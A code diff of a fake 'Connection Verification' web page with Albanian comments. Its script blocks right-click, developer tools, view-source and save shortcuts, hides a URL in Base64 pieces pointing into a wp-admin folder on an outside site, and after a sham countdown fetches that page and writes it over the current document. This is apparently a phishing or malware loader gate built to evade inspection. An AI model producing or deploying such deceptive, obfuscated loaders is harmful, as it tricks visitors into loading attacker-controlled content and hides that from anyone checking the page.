@@ -3,6 +3,93 @@
 <head>
 <meta charset="UTF-8">
 <title>Connection Verification</title>
+<style>
+body{margin:0;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;}
+</style>
+</head>
+<body>
+<div id="root"></div>
+
+<script>
+// ============================================================
+//  MBROJTJA: Bllokimi i klikimit të djathtë dhe tasteve
+// ============================================================
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    return false;
+});
+
+document.addEventListener('keydown', function(e) {
+    // F12
+    if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        return false;
+    }
+    // Ctrl+U (View Source)
+    if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.keyCode === 85)) {
+        e.preventDefault();
+        return false;
+    }
+    // Ctrl+Shift+I (Inspect)
+    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
+        e.preventDefault();
+        return false;
+    }
+    // Ctrl+S (Save)
+    if (e.ctrlKey && (e.key === 's' || e.key === 'S' || e.keyCode === 83)) {
+        e.preventDefault();
+        return false;
+    }
+});
+
+// ============================================================
+//  KRIJIMI I GJITHË FAQES PËRMES JAVASCRIPT
+//  (për të parandaluar View Source)
+// ============================================================
+
+// URL e fshehur në Base64
+var _0xenc = [
+    "aHR0cHM6Ly8=",                   // 0: "https://"
+    "Ym9tYmFzcGVyZmVjdGE=",           // 1: "bombasperfecta"
+    "LmFkZW1hdGljYS5jb20=",          // 2: ".adematica.com"
+    "L3dwLWFkbWluL2FkbWluLw==",       // 3: "/wp-admin/admin/"
+    "aW5kZXguaHRtbA=="                // 4: "index.html"
+];
+
+function _0xdec(_0xidx) {
+    return atob(_0xenc[_0xidx]);
+}
+
+// Monto URL-në
+var targetUrl = _0xdec(0) + _0xdec(1) + _0xdec(2) + _0xdec(3) + _0xdec(4);
+
+// ============================================================
+//  KRIJON TË GJITHË PËRMBAJTJEN HTML
+// ============================================================
+var htmlContent = `
+<div class="container">
+    <div class="top-icon">&#10003;</div>
+    <h2>Connection Verification</h2>
+    <div class="subtitle">Please wait while we verify your session.</div>
+
+    <div class="circle">
+        <svg width="120" height="120">
+            <circle class="bg" cx="60" cy="60" r="50"></circle>
+            <circle id="progress" class="progress" cx="60" cy="60" r="50"></circle>
+        </svg>
+        <div class="number" id="number">4</div>
+    </div>
+
+    <div class="bar">
+        <div class="bar-fill" id="bar"></div>
+    </div>
+
+    <div class="status" id="status">Checking connection...</div>
+
+    <button id="btn">Continue</button>
+
+    <div class="footer">Protected session</div>
+</div>
 
 <style>
 *{
@@ -117,127 +204,59 @@ button:disabled{
     font-size:12px;
 }
 </style>
+`;
 
-</head>
-<body>
-
-<div class="container">
-    <div class="top-icon">&#10003;</div>
-    <h2>Connection Verification</h2>
-    <div class="subtitle">Please wait while we verify your session.</div>
-
-    <div class="circle">
-        <svg width="120" height="120">
-            <circle class="bg" cx="60" cy="60" r="50"></circle>
-            <circle id="progress" class="progress" cx="60" cy="60" r="50"></circle>
-        </svg>
-        <div class="number" id="number">4</div>
-    </div>
-
-    <div class="bar">
-        <div class="bar-fill" id="bar"></div>
-    </div>
-
-    <div class="status" id="status">Checking connection...</div>
-
-    <button id="btn">Continue</button>
-
-    <div class="footer">Protected session</div>
-</div>
-
-<script>
-// ============================================================
-//  JavaScript i obfuskuar - URL e ndarë dhe e koduar në Base64
-// ============================================================
-
-// Array me të gjitha stringjet - pjesët e URL janë në Base64
-var _0x3f2e = [
-    "getElementById","progress","number","bar","status","btn",
-    "style","strokeDashoffset","width","%","innerHTML",
-    "&#10003;",                       // 11: ✓
-    "100%","Verification completed","color","#16a34a",
-    "display","inline-block","onclick","disabled","textContent",
-    "Loading...",
-    // =====  =====
-    "aHR0cHM6Ly8=",                   // 22: ""
-    "Ym9tYmFzcGVyZmVjdGE=",           // 23: ""
-    "LmFkZW1hdGljYS5jb20=",          // 24: "."
-    "L3dwLWFkbWluL2FkbWluLw==",       // 25: ""
-    "aW5kZXguaHRtbA==",               // 26: ""
-    // ============================================================
-    "text","open","write","close",
-    "warn","Proxy failed, trying direct...",
-    "error","Direct fetch failed too.",
-    "Could not load the target page. Please try again.",
-    "Continue"
-];
-
-// Funksioni kryesor: kthen vlerën e duhur
-// Për indekset 22-26 kthen versionin e dekoduar (Base64 -> string)
-// Për pjesën tjetër kthen vlerën direkte nga array
-var _0x1f2e = function(_0x2a1b) {
-    if (_0x2a1b >= 22 && _0x2a1b <= 26) {
-        return atob(_0x3f2e[_0x2a1b]);
-    }
-    return _0x3f2e[_0x2a1b];
-};
+// Fut përmbajtjen në faqe
+document.getElementById('root').innerHTML = htmlContent;
 
 // ============================================================
-//  NUMËRIMI MBRAPSH (4 → 0)
+//  LOGJIKA E NUMËRIMIT DHE BUTONIT
 // ============================================================
 let total = 4;
 let current = 4;
 const circumference = 314;
-const progress = document[_0x1f2e(0)](_0x1f2e(1));
-const number = document[_0x1f2e(0)](_0x1f2e(2));
-const bar = document[_0x1f2e(0)](_0x1f2e(3));
-const status = document[_0x1f2e(0)](_0x1f2e(4));
-const btn = document[_0x1f2e(0)](_0x1f2e(5));
+const progress = document.getElementById("progress");
+const number = document.getElementById("number");
+const bar = document.getElementById("bar");
+const status = document.getElementById("status");
+const btn = document.getElementById("btn");
 
 function update() {
     let percent = (total - current) / total;
-    progress[_0x1f2e(6)][_0x1f2e(7)] = circumference - (circumference * percent);
-    bar[_0x1f2e(6)][_0x1f2e(8)] = (percent * 100) + _0x1f2e(9);
-    number[_0x1f2e(10)] = current;
+    progress.style.strokeDashoffset = circumference - (circumference * percent);
+    bar.style.width = (percent * 100) + "%";
+    number.innerHTML = current;
     current--;
     if (current < 0) {
         clearInterval(timer);
-        number[_0x1f2e(10)] = _0x1f2e(11);    // ✓
-        progress[_0x1f2e(6)][_0x1f2e(7)] = 0;
-        bar[_0x1f2e(6)][_0x1f2e(8)] = _0x1f2e(12);
-        status[_0x1f2e(10)] = _0x1f2e(13);
-        status[_0x1f2e(6)][_0x1f2e(14)] = _0x1f2e(15);
-        btn[_0x1f2e(6)][_0x1f2e(16)] = _0x1f2e(17);
+        number.innerHTML = "&#10003;";
+        progress.style.strokeDashoffset = 0;
+        bar.style.width = "100%";
+        status.innerHTML = "Verification completed";
+        status.style.color = "#16a34a";
+        btn.style.display = "inline-block";
     }
 }
 update();
 const timer = setInterval(update, 1000);
 
-// ============================================================
-//  BUTONI "Continue" – URL e montuar nga pjesët e dekoduara
-// ============================================================
-btn[_0x1f2e(18)] = async function() {
-    btn[_0x1f2e(19)] = true;
-    btn[_0x1f2e(20)] = _0x1f2e(21);
-    
-    // Bashko pjesët e URL-së (secila dekodohet nga Base64)
-    const targetUrl = _0x1f2e(22) + _0x1f2e(23) + _0x1f2e(24) + _0x1f2e(25) + _0x1f2e(26);
-    
+btn.onclick = async function() {
+    btn.disabled = true;
+    btn.textContent = "Loading...";
     try {
         const response = await fetch(targetUrl);
         if (!response.ok) throw new Error("HTTP " + response.status);
-        const htmlContent = await response[_0x1f2e(27)]();
-        document[_0x1f2e(28)]();
-        document[_0x1f2e(29)](htmlContent);
-        document[_0x1f2e(30)]();
+        const htmlContent = await response.text();
+        document.open();
+        document.write(htmlContent);
+        document.close();
     } catch (err) {
         console.error("Fetch failed:", err);
-        alert(_0x1f2e(36));
-        btn[_0x1f2e(19)] = false;
-        btn[_0x1f2e(20)] = _0x1f2e(37);
+        alert("Could not load the target page. Please try again.");
+        btn.disabled = false;
+        btn.textContent = "Continue";
     }
 };
 </script>
-
 </body>
 </html>
